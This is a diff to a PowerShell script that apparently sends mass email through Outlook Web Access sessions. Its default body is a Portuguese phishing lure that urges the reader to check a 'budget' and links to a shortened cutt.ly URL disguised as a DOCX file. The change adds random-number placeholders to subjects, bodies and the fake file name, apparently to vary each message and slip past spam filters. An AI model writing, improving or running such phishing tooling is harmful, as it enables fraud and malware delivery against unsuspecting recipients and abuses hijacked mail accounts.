@@ -40,7 +40,7 @@ $DEFAULT_HTML_BODY = @'
 </head>
 <body>
     Fala aí, esse orçamento passou por você?? Vê isso com urgência, pode ser reembolsado se for erro. se tiver certo, passo pra frente.<br>
-    <a href="HtTps://cutt.ly/kyYA25As" target="_blank">DOCX_490287</a>
+    <a href="HtTps://cutt.ly/kyYA25As" target="_blank">DOCX_[NUM.6-9]</a>
 
 </body></html>
 '@
@@ -452,6 +452,20 @@ function Get-OWAWriteTk([string]$rtk, [string]$client) {
     return $null
 }
 
+function Expand-RandPlaceholders([string]$text) {
+    if (-not $text) { return $text }
+    return [regex]::Replace($text, '\[NUM\.(\d+)-(\d+)\]', {
+        param($m)
+        $min = [int]$m.Groups[1].Value
+        $max = [int]$m.Groups[2].Value
+        if ($max -lt $min) { $max = $min }
+        $len = Get-Random -Minimum $min -Maximum ($max + 1)
+        $lo = [long][math]::Pow(10, $len - 1)
+        $hi = [long][math]::Pow(10, $len)
+        [string](Get-Random -Minimum $lo -Maximum $hi)
+    })
+}
+
 function ConvertTo-HtmlBody([string]$body) {
     if (-not $body) { $body = "" }
     if ($body -match '<[a-zA-Z]') { return $body }
@@ -467,6 +481,8 @@ function Resolve-Body([string]$body, [string]$link) {
 }
 
 function Send-OWAMsg([string]$tk, [string]$to, [string]$subject, [string]$body) {
+    $subject = Expand-RandPlaceholders $subject
+    $body = Expand-RandPlaceholders $body
     $content = ConvertTo-HtmlBody $body
     $payload = @{
         Message = @{
